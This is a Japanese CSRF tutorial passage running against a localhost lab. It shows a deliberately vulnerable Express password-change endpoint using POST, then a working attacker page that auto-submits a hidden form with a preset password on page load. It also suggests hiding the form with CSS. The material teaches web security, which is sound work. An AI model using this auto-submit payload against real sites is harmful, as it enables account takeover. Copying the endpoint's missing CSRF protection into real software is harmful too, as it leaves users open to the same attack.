# POST を使ってみる

前節では、認証機構を取り入れたとしても CSRF の脆弱性が発生することを確認しました。
本節では、まず前節のような、リンクを送信するだけで行える攻撃を無効化するために POST メソッドを導入します。その後、単純に POST メソッドを用いるだけでは、CSRF の脆弱性が存在したままであることを示します。

## HTTP メソッドについて

GET や POST といった HTTP メソッドについて概要を説明します。
HTTP メソッドは、指定した URL にどのような操作を要求するのかを、クライアントがサーバー側に伝えるものです。たとえば、GET メソッドを使った場合は、指定した URL のリソースを取得すること求めていますし、POST メソッドを使った場合は、指定した URL に対して、なんらかの情報を送信して、それに紐づいた操作を行うことを求めます。

詳しくは下記の記事を参考にしてください
https://developer.mozilla.org/ja/docs/Web/HTTP/Messages
https://developer.mozilla.org/ja/docs/Web/HTTP/Methods

重要なことは、サーバー側のアプリケーションにとって HTTP メソッドはただの取り決めであり、求められた理念とは異なる処理を容易に実行できてしまうことです。理念とは異なる処理とは、例えば GET メソッドにパスワード変更の処理を紐づけるなどです。

## サンプルアプリの説明

サンプルアプリは以下のような実装です

```ts
// /3-post-password-change-dangerous というパスに post メソッドのリクエストがきたときにこの処理を実行する
router.post("/3-post-password-change-dangerous", (req, res) => {
  // cookie から sessionId をとりだし、それを検証してログイン済みかどうか確かめる
  const sessionId = req.cookies["sessionId"];
  const { newPassword } = req.body;
  if (!sessionId || !sessionIds[sessionId]) res.send("login required");
  //   新しいパスワードが送られてきているか確かめて、パスワードを更新する
  else if (typeof newPassword !== "string") res.send("newPassword is required");
  else {
    const userName = sessionIds[sessionId].userName;
    changePassword(userName, newPassword);
    res.send("password changed!");
  }
});
```

前節のコードと大きく変わったところは、HTTP メソッドが get から post になったことです。
では、このエンドポイントをどのように使うのかを確認しましょう。

## パスワード変更の正常系

ユーザーは、以下のページにアクセスします。

http://localhost:3000/3-post-password-change-dangerous

すると、フォームが表示されます。ユーザーは新しいパスワードを入力し、submit ボタンを押します。すると、http://localhost:3000/3-post-password-change-dangerous に post リクエストがとび、パスワードが変更されます。
なお、get リクエストのときは、以下のような処理が実行されています

```ts
router.get("/3-post-password-change-dangerous", (_req, res) => {
  res.send(`
    <form id="form" action="http://localhost:3000/3-post-password-change-dangerous" method="post">
    <input name="newPassword" type="text" value=""></input>
    <button type="submit">submit</buttion>
    </form>
    `);
});
```

## 防御の検証

POST メソッドを使ったことで、前回と同じような攻撃はできなくなっています。以下に説明します。
前回は、悪意のあるリンクをユーザーに送ることで、ユーザーがそのリンクを踏むと同時にパスワード変更のリクエストが送信され、ユーザーのパスワードが攻撃者の指定したパスワードに変更されてしまいました。
POST メソッドの場合を考えてみると、以下の二つの点から上記の攻撃ができなくなっていることがわかります。

- リンクをクリックしたときには GET リクエストが送られるため、POST リクエストを送信するためには、ユーザーが明示的に submit ボタンを押さなければならないこと
- URL クエリパラメータで攻撃者が新しいパスワードを指定することができないこと

そのため、たとえば攻撃者が以下のようなリンクをユーザーに送ったとしても、前節のように攻撃が成功することはありません。
http://localhost:3000/3-post-password-change-dangero?newPassword=evil

## 攻撃の検証

しかし、この post メソッドを使った防御はあっさりと破られます。
順番に見ていきましょう。

### URL クエリパラメータで攻撃者が新しいパスワードを指定することができないこと

まず、「URL クエリパラメータで攻撃者が新しいパスワードを指定することができないこと」について攻撃側の対応策を考えます。ようは、フォームの初期値を指定できればいいのです。そして、フォームの input タグは初期値を指定できます。そのため、自分でウェブサイトを作って、フォームの初期値を指定したページを用意します。そして、submit したときの送信先を http://localhost:3000/3-post-password-change-dangero にすれば、攻撃者が指定したパスワードで更新させることが可能です。ついでに、新しいパスワードの input 要素を CSS でめっちゃ小さくしたり、透明にしてユーザーから見えなくし、submit ボタンをリンク遷移のボタンなどに見せかければ完璧でしょう。

### POST リクエストを送信するためには、ユーザーが明示的に submit ボタンを押さなければならないこと

次に、「POST リクエストを送信するためには、ユーザーが明示的に submit ボタンを押さなければならないこと」について対応策を考えます。
結論からいえば、javascript を使うことで、自動でフォームを送信することが可能です。フォームの初期値設定と組み合わせることで、ユーザーがリンクをクリックしてページが読み込まれた瞬間に、攻撃者が指定したパスワードに更新する POST リクエストを自動で送ることができるのです。

### 具体的な攻撃

攻撃者は、以下のようなページを用意します。

```ts
app.get("/3-post-password-change-dangerous", (_req, res) => {
  res.send(`
  <form id="form" action="${ORIGIN_BASE_URL}/3-post-password-change-dangerous" method="post" style="display: none;">
  <input name="newPassword" type=text value="aaaaaaa"></input>
  <button type="submit">submit</buttion>
  </form>
  <script>
      const form = document.getElementById("form")
      form.submit()
  </script>
`);
});
```

注目してほしいのは、以下の二点です。
まず、こちらでフォームの初期値を `aaaaaaa` に設定しています。

```html
<input name="newPassword" type=text value="aaaaaaa"></input>
```

次に、こちらでこのスクリプト部分が読み込まれた瞬間にフォームを送信しています。

```ts
const form = document.getElementById("form");
form.submit();
```

実際に攻撃してみましょう。以下のリンクにアクセスすると、上記のコードが実行され、パスワードが変更されたというログがでるはずです。
http://localhost:4000/3-post-password-change-dangerous
